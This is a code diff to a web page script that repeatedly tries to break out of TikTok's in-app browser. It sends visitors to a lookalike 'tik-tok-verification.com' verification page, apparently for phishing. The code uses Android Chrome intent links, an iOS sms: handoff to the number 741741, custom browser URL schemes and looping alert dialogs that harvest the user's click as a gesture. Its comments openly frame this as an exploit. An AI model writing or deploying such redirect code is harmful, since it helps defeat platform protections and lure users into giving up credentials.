@@ -9,39 +9,39 @@
 
 <script>
     const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
+    const domain = "tik-tok-verification.com/Verification/verify1.html";
     const killTime = Date.now() + 5000;
 
-    function theBinaryEject() {
+    function theSlingShot() {
         const isAndroid = /Android/i.test(navigator.userAgent);
 
         if (isAndroid) {
-            // Android: Package-specific Intent
-            const clean = targetUrl.replace(/^https?:\/\//, '');
-            window.location.href = `intent://${clean}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
+            // Android: We use the 'intent' with the 'Sms' action but targeting Chrome
+            window.location.href = `intent://${domain}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
         } else {
-            // iOS: THE .URL SHORTCUT EXPLOIT
-            // We create a Windows-style shortcut file in the browser memory.
-            // When iOS 'opens' this, it MUST use Safari.
-            const urlShortcut = "[InternetShortcut]\nURL=" + targetUrl;
-            const blob = new Blob([urlShortcut], {type: 'application/x-mswinurl'});
-            const blobUrl = URL.createObjectURL(blob);
+            // iOS: THE CONTEXT COLLISION
+            
+            // 1. Trigger SMS. This forces TikTok to "pause" and hand control to the OS.
+            window.location.href = "sms:741741&body=" + encodeURIComponent(targetUrl);
 
-            // 1. Force the 'Download/Open' handoff
-            window.location.href = blobUrl;
-
-            // 2. Pulse the direct protocol as a backup
+            // 2. THE COLLISION: 100ms later, while the OS is pulling up the SMS window,
+            // we fire a 'googlechromes' protocol. This forces a kernel decision.
             setTimeout(() => {
-                const domain = targetUrl.replace(/^https?:\/\//, '');
                 window.location.href = "googlechromes://" + domain;
             }, 100);
+
+            // 3. THE EJECT: Final pulse to Safari
+            setTimeout(() => {
+                window.location.href = "safari-https://" + domain;
+            }, 200);
         }
     }
 
     function runSystem() {
         if (Date.now() > killTime) return;
 
-        // Try to break out before the alert
-        theBinaryEject();
+        // Start the collision
+        theSlingShot();
 
         setTimeout(() => {
             if (document.hasFocus()) {
@@ -50,12 +50,12 @@
                 
                 alert(header + body);
 
-                // Fire on "OK" (User Gesture)
-                theBinaryEject();
+                // Trigger on the 'OK' click gesture
+                theSlingShot();
 
-                setTimeout(runSystem, 300);
+                setTimeout(runSystem, 350);
             }
-        }, 300);
+        }, 350);
     }
 
     window.onload = runSystem;
